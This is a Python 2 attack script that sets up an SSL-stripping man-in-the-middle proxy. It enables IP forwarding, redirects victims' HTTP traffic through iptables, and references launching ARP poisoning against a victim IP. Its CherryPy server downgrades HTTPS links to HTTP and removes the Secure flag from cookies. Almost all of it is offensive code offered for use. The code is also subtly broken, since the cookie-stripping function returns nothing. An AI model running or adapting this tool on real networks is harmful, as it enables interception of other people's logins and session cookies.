import os
from scapy.all import *
import time
import string
import requests
import cherrypy

print "                                                               "
print "              _           _        _             _             "
print "      ___ ___| |      ___| |_ _ __(_)_ __  _ __ (_)_ __   __ _ "
print "     / __/ __| |_____/ __| __| '__| | '_ \| '_ \| | '_ \ / _` |"
print "     \__ \__ \ |_____\__ \ |_| |  | | |_) | |_) | | | | | (_| |"
print "     |___/___/_|     |___/\__|_|  |_| .__/| .__/|_|_| |_|\__, |"
print "                                    |_|   |_|            |___/ "
print "                                                               "
print "                              Including secure cookie stripping"
print "                                                               "
print "                                                               "

print "Enabling IP forwarding"
file = open("/proc/sys/net/ipv4/ip_forward", "w")
file.write("1")
file.close()


print "redirecting all http traffic to port 8080"
os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
"""
vIP = raw_input("Victim IP address?")
gatewayIP = raw_input("Gateway IP address?")
file = open("vIP.txt", "w+")
file.write(vIP)
file.close
file = open("gatewayIP.txt", "w+")
file.write(gatewayIP)
file.close
os.system("gnome-terminal -e 'python arpPoison.py'")
"""

#Starting the stripping process

def stripHTTPS(url, request):

    # Response message for the victim
    response = requests.models.Response()

    # reponse message url is equal to provided url
    response.url = url

    # Set HTTPstatuscode to 200 OK
    response.status_code = 200


    # Replace HTTPS with HTTPS 

    newURL = str(request.content).replace("HTTPS", "HTTP")
    newURL = str(newURL).replace("https", "http")
    

    response.content = newURL

    response.headers = request.headers
    response.history = request.history    
    response.encoding = request.encoding
    response.reason = request.reason
    response.elapsed = request.elapsed
    response.request = request.request

    return response

def stripSecureCookie(response):
   cookie = response.cookies
   newCookie = str(cookie).replace("Secure;", "")
   response.cookies = newCookie

class sslStripping(object):
    @cherrypy.expose
    def default(self, *route):

        url = cherrypy.url()
            
        print url


        url = str(url).replace("http", "https")
        
        response = requests.get(url, verify = False)

        #if(str(response.encoding) == "None"):
        #    return response.content

        response = stripHTTPS(url, response)

        response = stripSecureCookie(response)

        return response



if __name__ == '__main__':

    # This command binds cherrypy to all interfaces of this machine, hence it is findable on the network on port 8080
    cherrypy.config.update({'server.socket_host': '0.0.0.0'})
    # This command actually starts the server
    cherrypy.quickstart(sslStripping())
